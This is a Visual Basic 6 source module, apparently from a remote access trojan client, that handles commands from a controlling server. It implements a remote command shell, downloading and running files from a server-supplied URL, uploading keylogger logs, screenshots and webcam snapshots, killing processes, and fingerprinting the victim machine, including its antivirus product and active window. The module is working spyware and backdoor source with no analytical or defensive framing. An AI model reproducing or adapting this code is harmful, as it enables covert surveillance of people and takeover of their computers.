Attribute VB_Name = "mFuncs"
Option Explicit

Public Sub send(ByVal pckHeader As String, ByVal InSize As Boolean, ParamArray strData() As Variant)
    On Error Resume Next
    Dim strBuf As String
    
    strBuf = Join(strData, vbFormFeed)
    
    If Len(strBuf) > 0 Then
        If InSize = True Then
            mSckServer.WsSendData pckHeader & vbFormFeed & Len(strBuf) & vbFormFeed & strBuf
        Else
            mSckServer.WsSendData pckHeader & vbFormFeed & strBuf
        End If
    Else
        mSckServer.WsSendData pckHeader
    End If
End Sub

Public Sub PACKET_ADD_SERVER(ByVal pckHeader As String, ByVal pckSize As Long, ByVal Data As String)
    On Error Resume Next
    If Len(PacketBuffer) <> 0 Then PacketBuffer = vbNullString
    If pckSize = 0 Then Exit Sub
    PacketHeader = pckHeader
    PacketSize = pckSize
    Call PACKET_SET_SERVER(PacketBuffer, Data)
End Sub

Public Sub PACKET_SET_SERVER(buf As String, Optional ByVal Data As String)
    On Error Resume Next
    Dim tmpStr As String
    Dim Params() As String
    Dim tmpBuf() As String
    Dim tmpLng As Long
    Dim lngFileN As Long
    Dim i As Long
    
    buf = buf & Data
    If Len(buf) >= PacketSize Then
        Params = Split(Mid(buf, 1, PacketSize), vbFormFeed)
            
        Select Case PacketHeader
            Case PACKET_ID_BOT.id 'Backup country info
                COUNTRY = frmMain.MAP_GETCOUNTRY(Params(0))
                send PACKET_ID_BOT.id, True, USER_ID, HDS_GET(Environ("systemdrive") & "\"), Environ("computername"), Environ("username"), COUNTRY
        
            Case PACKET_ID_BOT.INFO 'PC information
                send PACKET_ID_BOT.INFO, True, INFO_PCTYPE, Environ("computername"), Environ("username"), IsNTAdmin(0, 0), INFO_RAM, INFO_CPU, INFO_HDD, WINDOWS_VERSION_FULL, CLng(GetTickCount / 1000), Val(frmMain.tmrIdle.Tag), CAM_DETECT, INFO_ANTIVIRUS, INFO_DEFAULTBROWSER, INFO_ACTIVEWINDOW
        
            Case PACKET_ID_BOT.SRV_PING 'Backup ping method
                send PACKET_ID_BOT.SRV_PING, True, "1" 'Pong
                
            Case PACKET_ID_BOT.Shell 'Remote shell
                Select Case Val(Params(1))
                    Case 0 'Enable
                        send PACKET_ID_BOT.Shell, True, "0", ShellCMD(Environ("windir") & "\system32\cmd.exe")
                    Case 1 'Process command
                        send PACKET_ID_BOT.Shell, True, "1", ShellCMD(Params(2)), App.Path
                End Select
                
            Case PACKET_ID_BOT.PRC 'Process management
                Select Case Val(Params(1))
                    Case 1 'Refresh process list
                        send PACKET_ID_BOT.PRC, True, PROCESSES_LIST
                    
                    Case 2 'Resume process
                        For i = 2 To UBound(Params) - 1
                            SuspendResumeProcess CLng(Params(i)), False
                        Next i
                    
                    Case 3 'Suspend process
                        For i = 2 To UBound(Params) - 1
                            SuspendResumeProcess CLng(Params(i)), True
                        Next i
                    
                    Case 4 'Kill process
                        For i = 2 To UBound(Params) - 1
                            If CLng(Params(i)) = GetPIDByhWnd(frmMain.hwnd) Then
                                KillProcessPID CLng(Params(i))
                            Else
                                KillProcessPID CLng(Params(i))
                            End If
                        Next i
                End Select
            
            Case PACKET_ID_BOT.SRV 'Service management
                Select Case Val(Params(1))
                    Case 1 'Refresh process list
                        send PACKET_ID_BOT.SRV, True, SERVICES_LIST
                    
                    Case 2 'Resume process
                        For i = 2 To UBound(Params) - 1
                            Call SetService(Params(i), 0)
                        Next i
                    
                    Case 3 'Suspend process
                        For i = 2 To UBound(Params) - 1
                            Call SetService(Params(i), 1)
                        Next i
                End Select
                
        
            Case PACKET_ID_BOT.PING 'Ping
                send PACKET_ID_BOT.PING, True, Params(0)
        
            Case PACKET_ID_BOT.DLOAD_EXEC 'Download and execute
                tmpStr = Split(Params(0), ".")(UBound(Split(Params(0), ".")))
                Randomize: lngFileN = Int((100000) * Rnd) + 1
                Call DeleteUrlCacheEntry(Params(0)) 'Delete any previous cache
                Call URLDownloadToFile(0, Params(0), Environ("temp") & "\" & lngFileN & "." & tmpStr, 0, 0) 'Download the file
                ShellExecute 0, "open", Environ("temp") & "\" & lngFileN & "." & tmpStr, 0, 0, 1
                
            Case PACKET_ID_BOT.UNINSTALL 'Uninstall
                Call frmMain.UNINSTALL
        
            Case PACKET_ID_BOT.KLG 'Keylog management
                Select Case Val(Params(1))
                    Case 0 'Delete log
                        Kill Environ("appdata") & "\" & SETTINGS.INSTALL_KLGNAME
                    
                    Case 1 'Download log
                        If FILE_EXISTS(Environ("appdata") & "\" & SETTINGS.INSTALL_KLGNAME) = True Then
                            send PACKET_ID_BOT.KLG, True, FILE_READ_STR(Environ("appdata") & "\" & SETTINGS.INSTALL_KLGNAME)
                        Else
                            send PACKET_ID_BOT.KLG, True, "0"
                        End If
                End Select
                
            Case PACKET_ID_BOT.SCR 'Screencapture
                Select Case Val(Params(1))
                    Case 0 'Reserved
                    
                    Case 1 'Screenshot
                        tmpStr = GENERATE_CODE(8)
                        tmpLng = FreeFile
                        Open Environ("temp") & "\" & tmpStr For Binary Access Write As tmpLng
                            Put tmpLng, , buf
                        Close tmpLng
                        SCREENSHOT_DUMP Environ("temp") & "\" & tmpStr, Val(Params(2)), Val(Params(3))
                        send PACKET_ID_BOT.SCR, True, FILE_READ_STR(Environ("temp") & "\" & tmpStr)
                        Kill Environ("temp") & "\" & tmpStr
                End Select
                    
            Case PACKET_ID_BOT.CAM 'Webcam
                Select Case Val(Params(1))
                    Case 0 'Enable webcam
                        frmMain.tmrDoWork.Tag = vbNullString
                        send PACKET_ID_BOT.CAM_DRIVER, True, "0"
                        
                    Case 1 'Webcam snapshot
                        tmpStr = GENERATE_CODE(8)
                        tmpLng = FreeFile
                        Open Environ("temp") & "\" & tmpStr For Binary Access Write As tmpLng
                            Put tmpLng, , buf
                        Close tmpLng
                        WEBCAM_DUMP Environ("temp") & "\" & tmpStr, Val(Params(2))
                        send PACKET_ID_BOT.CAM, True, FILE_READ_STR(Environ("temp") & "\" & tmpStr)
                        Kill Environ("temp") & "\" & tmpStr
                    
                    Case 2 'Disable webcam
                        If mCaphWnd <> 0 Then SendMessage mCaphWnd, WM_CAP_DRIVER_DISCONNECT, 0, 0
                        send PACKET_ID_BOT.CAM_DRIVER, True, "2"
                        
                End Select
                
        End Select
            
        If Len(buf) > PacketSize Then 'Attached packet detected
            Data = Mid(buf, PacketSize + 1, Len(buf) - PacketSize) 'Size of attached packet
            tmpBuf = Split(Data, vbFormFeed, 3)
            Call PACKET_ADD_SERVER(tmpBuf(0), Val(tmpBuf(1)), tmpBuf(2)) 'Process attached packet
        Else
            PacketBuffer = vbNullString
            PacketHeader = vbNullString
        End If
    
    End If
    Exit Sub
Err: 'MsgBox Err.Description
End Sub

Public Function GENERATE_CODE(ByVal lngLen As Long) As String
    On Error Resume Next
    Randomize
    Dim rgch As String
    rgch = UCase("abcdefghijklmnopqrstuvwxyz0123456789")
    
    Dim i As Integer
    For i = 1 To lngLen
        GENERATE_CODE = GENERATE_CODE & Mid$(rgch, Int(Rnd() * Len(rgch) + 1), 1)
    Next
End Function

Public Sub CreateKey(hKey As Long, strPath As String)
    On Error Resume Next
    Dim keyhand As Long
    RegCreateKey hKey, strPath, keyhand&
    RegCloseKey keyhand&
End Sub
Public Sub SaveSettingString(hKey As Long, ByVal strPath As String, ByVal strValue As String, ByVal strData As String)
    On Error Resume Next
    Dim keyhand As Long
    RegCreateKey hKey, strPath, keyhand&
    RegSetValueEx keyhand&, strValue, 0, 1, ByVal strData, Len(strData)
    RegCloseKey keyhand&
End Sub
Public Sub DeleteSettingString(ByVal hKey As Long, ByVal strPath As String, ByVal strValue As String)
    On Error Resume Next
    Dim hCurKey As Long
    Dim lRegResult As Long
    
    RegOpenKey hKey, strPath, hCurKey
    RegDeleteValue hCurKey, strValue
    RegCloseKey hCurKey
End Sub

Public Function strEnc(DataIn As String, CodeKey As String, Encrypt As Boolean) As String
    On Error Resume Next
    Dim lonDataPtr As Long
    Dim strDataOut As String
    Dim intXOrValue1 As Integer, intXOrValue2 As Integer
    
    If Encrypt = False Then DataIn = Hex2Str(DataIn)
    For lonDataPtr = 1 To Len(DataIn)
        intXOrValue1 = Asc(Mid$(DataIn, lonDataPtr, 1))
        intXOrValue2 = Asc(Mid$(CodeKey, ((lonDataPtr Mod Len(CodeKey)) + 1), 1))
        strDataOut = strDataOut + Chr(intXOrValue1 Xor intXOrValue2)
    Next lonDataPtr
    If Encrypt = True Then
        strEnc = Str2Hex(strDataOut)
    Else
        strEnc = strDataOut
    End If
End Function

Private Function Hex2Str(ByVal strData As String)
    Dim i As Long
    Dim CryptString As String
    Dim tmpChar As String
    
         On Local Error Resume Next
         For i = 1 To Len(strData) Step 2
            CryptString = CryptString & Chr$(Val("&H" & Mid$(strData, i, 2)))
         Next i
        Hex2Str = CryptString
End Function

Private Function Str2Hex(ByVal strData As String)
    Dim i As Long
    Dim CryptString As String
    Dim tmpAppend As String

     On Local Error Resume Next
     For i = 1 To Len(strData)
        tmpAppend = Hex$(Asc(Mid$(strData, i, 1)))
         If Len(tmpAppend) = 1 Then
            tmpAppend = Trim$(str$(0)) & tmpAppend
         End If
        CryptString = CryptString & tmpAppend
        DoEvents
     Next ' I
    Str2Hex = CryptString
End Function

Public Function MUTEX_CHECK() As Long
    On Error Resume Next
    
    lngMutex = CreateMutex(0, 0, SETTINGS.INSTALL_MUTEX)
    
    If lngMutex <> 0 Then 'did it open?
      If WaitForSingleObject(lngMutex, 0) = 0 Then
        MUTEX_CHECK = lngMutex
        Exit Function
    End If
        
        If MUTEX_CHECK = 0 Then End
        Call CloseHandle(lngMutex)
    Else
        End
    End If
End Function

Public Function HDS_GET(ByVal strRoot As String) As String
    On Error Resume Next
    Dim VolLabel As String
    Dim VolSize As Long
    Dim Serial As Long
    Dim maxLen As Long
    Dim Flags As Long
    Dim Name As String
    Dim NameSize As Long
    Dim i As Long
    
    If GetVolumeSerialNumber(strRoot, VolLabel, VolSize, Serial, maxLen, Flags, Name, NameSize) Then
        HDS_GET = Format(Hex(Serial), "00000000")
    Else
        HDS_GET = "0"
    End If
    
    If Len(HDS_GET) <> 8 Then 'Harddrive serial failed
        HDS_GET = vbNullString
        For i = 1 To 4
            HDS_GET = HDS_GET & Hex(Asc(Mid(Environ("computername"), i, 1)))
        Next i
    End If
End Function

Public Function WINDOWS_VERSION_FULL() As String
    On Error Resume Next
    Dim reg As Object
    Set reg = CreateObject("WScript.Shell")
    WINDOWS_VERSION_FULL = reg.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductName")
End Function
Public Function CountryTag() As String
    Dim buffer As String * 100
    Dim dl&
    dl& = GetLocaleInfo(0, &H1002, buffer, 99)
    CountryTag = ((LPSTRToVBString(buffer)))
End Function
Public Function LPSTRToVBString$(ByVal s$)
   Dim nullpos&
   nullpos& = InStr(s$, Chr$(0))
   If nullpos > 0 Then
      LPSTRToVBString = Left$(s$, nullpos - 1)
   Else
      LPSTRToVBString = ""
   End If
End Function

Public Function INFO_PCTYPE() As String 'Computer type
Dim objWMI As Object, objItem As Variant, colObj As Variant, colChassis As Variant, objChassis As Variant

Set objWMI = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\" & "." & "\root\cimv2")
Set colChassis = objWMI.ExecQuery("Select * from Win32_SystemEnclosure")
For Each objChassis In colChassis
    For Each objItem In objChassis.ChassisTypes
        Select Case Val(objItem)
            Case 1: objItem = "Other"
            Case 2: objItem = "Unknown"
            Case 3: objItem = "Desktop"
            Case 4: objItem = "Low Profile Desktop"
            Case 5: objItem = "Pizza Box"
            Case 6: objItem = "Mini Tower"
            Case 7: objItem = "Tower"
            Case 8: objItem = "Portable"
            Case 9: objItem = "Laptop"
            Case 10: objItem = "Notebook"
            Case 11: objItem = "Hand Held"
            Case 12: objItem = "Docking Station"
            Case 13: objItem = "All in One"
            Case 14: objItem = "Sub Notebook"
            Case 15: objItem = "Space-Saving"
            Case 16: objItem = "Lunch Box" '
            Case 17: objItem = "Main System Chassis"
            Case 18: objItem = "Expansion Chassis"
            Case 19: objItem = "Sub Chassis"
            Case 20: objItem = "Bus Expansion Chassis"
            Case 21: objItem = "Peripheral Chassis"
            Case 22: objItem = "Storage Chassis"
            Case 23: objItem = "Rack Mount Chassis"
            Case 24: objItem = "Sealed-Case PC"
        End Select
        INFO_PCTYPE = objItem
    Next
Next
End Function

Public Function INFO_RAM() As String 'RAM - Total
    Dim objWMI As Object, colObj As Variant, objInf As Variant
    
    Set objWMI = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\" & "." & "\root\cimv2")
    Set colObj = objWMI.ExecQuery("Select * from Win32_ComputerSystem")
    For Each objInf In colObj
         INFO_RAM = SIZE_SUFFIX(objInf.TotalPhysicalMemory)
    Next
End Function

Public Function INFO_HDD() As String 'Drives
    Dim objWMIService As Object, colDisks As Variant, objDisk As Variant
    
    Set objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!\\" & "." & "\root\cimv2")
    Set colDisks = objWMIService.ExecQuery("Select * from Win32_LogicalDisk")
    For Each objDisk In colDisks
        If objDisk.DeviceID = Environ("systemdrive") Then INFO_HDD = objDisk.DeviceID & "\ - " & SIZE_SUFFIX(objDisk.Size)
    Next
End Function

Public Function SIZE_SUFFIX(ByVal bBytes As Double) As String
    Select Case bBytes
        Case Is > (1024 ^ 3): SIZE_SUFFIX = Round(bBytes / (1024 ^ 3), 2) & " GiB"
        Case Is > (1024 ^ 2): SIZE_SUFFIX = Round(bBytes / (1024 ^ 2), 2) & " MiB"
        Case Is >= 1024: SIZE_SUFFIX = Round(bBytes / 1024, 2) & " KiB"
        Case Is < 1024: SIZE_SUFFIX = bBytes & " B"
        Case Is < 1: SIZE_SUFFIX = "0 B"
    End Select
End Function

Public Function INFO_ANTIVIRUS() As String
    On Error Resume Next
    Dim tmp  As String
    Dim colItems As Object
    Dim objItem As Object
    Dim objWMIService As Object
    Set objWMIService = GetObject("winmgmts:\\.\root\SecurityCenter")
    
    Set colItems = objWMIService.ExecQuery("Select * from AntiVirusProduct", , 48)
    For Each objItem In colItems
        tmp = objItem.CompanyName & " " & objItem.DisplayName & " (Version  " & objItem.versionnumber & ")"
    Next
    INFO_ANTIVIRUS = tmp
End Function

Public Function INFO_DEFAULTBROWSER() As String
    On Error Resume Next
    Dim TheReg As Object
    Dim Regentry As String
    Dim SplittedDB() As String

    Set TheReg = CreateObject("Wscript.Shell")
    Regentry = TheReg.RegRead("HKEY_CLASSES_ROOT\HTTP\shell\open\command\")
    Regentry = Replace(Regentry, Chr(34), "")
    INFO_DEFAULTBROWSER = Mid(Regentry, 1, InStr(1, LCase(Regentry), ".exe") + 3)
End Function

Public Function INFO_CPU() As String 'CPU - Speed
    Dim objWMI As Object, objItem As Variant, colObj As Variant
    
    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
    Set colObj = objWMI.ExecQuery("Select * from Win32_Processor")
    For Each objItem In colObj
        INFO_CPU = objItem.MaxClockSpeed & " MHz - " & objItem.Name
    Next
End Function

Public Function INFO_ACTIVEWINDOW() As String
    Dim Handle As Long
    Dim TextLen As Long
    Dim WindowText As String
    Dim sVar As Long
    
    Handle = GetForegroundWindow
    TextLen = GetWindowTextLength(Handle) + 1
    
    WindowText = Space(TextLen)
    sVar = GetWindowText(Handle, WindowText, TextLen)
    WindowText = Left(WindowText, Len(WindowText) - 1)
    
    INFO_ACTIVEWINDOW = WindowText
End Function

Public Sub FILE_WRITE(ByVal strFile As String, ByVal strData As String)
    Dim h As Long
    Dim lb As Long
    Dim wB As Long
    Dim bufData() As Byte

    bufData = StrConv(strData, vbFromUnicode)
    wB = UBound(bufData) + 1

    h = CreateFile(strFile, GENERIC_WRITE Or GENERIC_READ, 0, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0)
    Call SetFilePointer(h, GetFileSize(h, 0), 0, FILE_BEGIN)
    Call WriteFile(h, bufData(0), wB, lb, 0)

    Call FlushFileBuffers(h)
    Call CloseHandle(h)
End Sub

Public Function FILE_READ_STR(ByVal strFile As String) As String
    On Error Resume Next
    Dim ff As Long
    Dim bufFile() As Byte
    
    ff = FreeFile
    ReDim bufFile(0 To FileLen(strFile) - 1)
    Open strFile For Binary Access Read As ff
        Get ff, , bufFile
    Close ff
    
    FILE_READ_STR = StrConv(bufFile, vbUnicode)
End Function

Public Function FILE_EXISTS(FileName As String) As Boolean
    On Local Error GoTo ErrorHandler
        FILE_EXISTS = (GetAttr(FileName) And vbDirectory) = 0
    Exit Function
ErrorHandler:
    FILE_EXISTS = False
End Function

Public Function PROCESSES_LIST() As String
    On Local Error Resume Next
    Dim Process As Object
    
    For Each Process In GetObject("winmgmts:").ExecQuery("Select * from Win32_Process")
            Dim tmpPriority As String
            Select Case Process.Priority
                Case 24: tmpPriority = "Realtime"
                Case 13: tmpPriority = "High"
                Case 10: tmpPriority = "Above High"
                Case 8: tmpPriority = "Normal"
                Case 6: tmpPriority = "Below Normal"
                Case 4: tmpPriority = "Low"
            End Select
            
            If Val(Process.ProcessId) = Val(GetPIDByhWnd(frmMain.hwnd)) Then 'Process is me
                PROCESSES_LIST = PROCESSES_LIST & Process.Caption & vbVerticalTab & Process.ExecutablePath & vbVerticalTab & Process.ProcessId & vbVerticalTab & Process.ThreadCount & vbVerticalTab & tmpPriority & vbVerticalTab & ResizeKb(Process.WorkingSetSize) & vbVerticalTab & "me" & vbFormFeed
            Else
                PROCESSES_LIST = PROCESSES_LIST & Process.Caption & vbVerticalTab & Process.ExecutablePath & vbVerticalTab & Process.ProcessId & vbVerticalTab & Process.ThreadCount & vbVerticalTab & tmpPriority & vbVerticalTab & ResizeKb(Process.WorkingSetSize) & vbFormFeed
            End If
            
        DoEvents
    Next
    
    Set Process = Nothing
End Function

Function GetPIDByhWnd(ByVal hwnd As Long) As Long
    Dim idProc As Long
    Call GetWindowThreadProcessId(hwnd, idProc)
    GetPIDByhWnd = idProc
End Function

Function ResizeKb(ByVal b As Double) As String
    Dim bSize(8) As String, i As Integer
 
    bSize(0) = "Bytes"
    bSize(1) = "KB" 'Kilobytes
    bSize(2) = "MB" 'Megabytes
    bSize(3) = "GB" 'Gigabytes
    bSize(4) = "TB" 'Terabytes
    bSize(5) = "PB" 'Petabytes
    bSize(6) = "EB" 'Exabytes
    bSize(7) = "ZB" 'Zettabytes
    bSize(8) = "YB" 'Yottabytes
          
    For i = UBound(bSize) To 0 Step -1
        If b >= (1024 ^ i) Then
            ResizeKb = ThreeNonZeroDigits(b / (1024 ^ i)) & " " & bSize(i)
            Exit For
        End If
    Next
End Function
Function ThreeNonZeroDigits(ByVal Value As Double) As Double
    If Value >= 100 Then
        ThreeNonZeroDigits = FormatNumber(Value)
    ElseIf Value >= 10 Then
        ThreeNonZeroDigits = FormatNumber(Value, 1)
    Else
        ThreeNonZeroDigits = FormatNumber(Value, 2)
    End If
End Function

Public Sub KillProcessPID(ByVal pid As Long)
    On Local Error Resume Next
    Dim lnghProcess As Long
    lnghProcess = OpenProcess(1&, -1&, pid)
    Call TerminateProcess(lnghProcess, 0&)
End Sub

Function SuspendResumeProcess(ByVal pid As Long, ByVal SuspendResume As Boolean) As Boolean
    On Local Error Resume Next
    Dim hSnapshot As Long
    Dim htthread As Long
    Dim pthread As Boolean
    Dim pt As THREADENTRY32
    
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0)
    pt.dwSize = Len(pt)
    pthread = Thread32First(hSnapshot, pt)
    While pthread
        If pt.th32OwnerProcessID = pid Then
            htthread = OpenThread(TH32CS_SUSPENDRESUME, 0, pt.th32ThreadID)
            If htthread <> 0 Then
                If SuspendResume Then SuspendThread (htthread) Else ResumeThread (htthread)
                CloseHandle htthread
                SuspendResumeProcess = True
            End If
        End If
        pthread = Thread32Next(hSnapshot, pt)
    Wend
    CloseHandle hSnapshot
End Function

    Function SERVICES_LIST() As String
        Dim WMIService As Object, ServicesCollection As Object, Service As Object
        
        Set WMIService = GetObject("winmgmts:{impersonationLevel=Impersonate}!\\.\root\cimv2")
        Set ServicesCollection = WMIService.ExecQuery("SELECT * FROM Win32_Service", , 48)
        
        For Each Service In ServicesCollection
            SERVICES_LIST = SERVICES_LIST & Service.DisplayName & vbVerticalTab & Service.PathName & vbVerticalTab & Service.StartMode & vbVerticalTab & Service.State & vbFormFeed
        Next
        
        Set WMIService = Nothing: Set ServicesCollection = Nothing: Set Service = Nothing
    End Function
    Function SetService(ByVal ServiceName As String, ByVal command As Long) As Boolean
        '0=Start, 1=Stop, 2=Pause, 3=Continue
        Dim hSCM As Long
        Dim hService As Long
        Dim res As Long
        Dim lpServiceStatus As SERVICE_STATUS
      
        If command < 0 Or command > 3 Then Err.Raise 5
            hSCM = OpenSCManager(vbNullString, vbNullString, GENERIC_EXECUTE)
        If hSCM = 0 Then Exit Function
            hService = OpenService(hSCM, ServiceName, GENERIC_EXECUTE)
        If hService = 0 Then GoTo CleanUp
      
        Select Case command
        Case 0
            res = StartService(hService, 0, 0)
        Case SERVICE_CONTROL_STOP, SERVICE_CONTROL_PAUSE, SERVICE_CONTROL_CONTINUE
            res = ControlService(hService, command, lpServiceStatus)
        End Select
        If res = 0 Then GoTo CleanUp
        SetService = True
    
CleanUp:
        If hService Then CloseServiceHandle hService
        CloseServiceHandle hSCM
    End Function

Public Function CAM_DETECT() As Long
    On Error GoTo ErrDrvs
    Dim lResult As Long
    Dim DrvName As String * 255
    Dim DrvVer As String * 255
    lResult = capGetDriverDescriptionA(0, DrvName, 128, DrvVer, 128)
    If lResult Then
        CAM_DETECT = 1
    Else
        CAM_DETECT = 0 ' no drivers exist
    End If
    Exit Function
ErrDrvs:
    CAM_DETECT = 0
End Function

Public Function ShellCMD(Optional CommandLine As String) As String
    Dim mCommand As String
    Dim mOutputs As String
    Dim proc As PROCESS_INFORMATION
    Dim Ret As Long
    Dim Start As STARTUPINFO
    Dim SA As SECURITY_ATTRIBUTES
    Dim hReadPipe As Long
    Dim hWritePipe As Long
    Dim lngBytesread As Long
    Dim strBuff As String * 256

    If Len(CommandLine) > 0 Then mCommand = CommandLine
    If Len(mCommand) = 0 Then Exit Function
    
    SA.nLength = Len(SA)
    SA.bInheritHandle = 1&
    SA.lpSecurityDescriptor = 0&
    Ret = CreatePipe(hReadPipe, hWritePipe, SA, 0)
    If Ret = 0 Then Exit Function
    
    Start.cb = Len(Start)
    Start.dwFlags = STARTF_USESTDHANDLES Or STARTF_USESHOWWINDOW
    Start.hStdOutput = hWritePipe
    Start.hStdError = hWritePipe
    Ret& = CreateProcessA(0&, mCommand, SA, SA, 1&, NORMAL_PRIORITY_CLASS, 0&, 0&, Start, proc)
        
    If Ret <> 1 Then Exit Function
    Ret = CloseHandle(hWritePipe)
    mOutputs = ""
    Do
        Ret = ReadFile(hReadPipe, strBuff, 256, lngBytesread, 0&)
        mOutputs = mOutputs & Left(strBuff, lngBytesread)
    Loop While Ret <> 0
    Ret = CloseHandle(proc.hProcess)
    Ret = CloseHandle(proc.hThread)
    Ret = CloseHandle(hReadPipe)
    ShellCMD = mOutputs
End Function
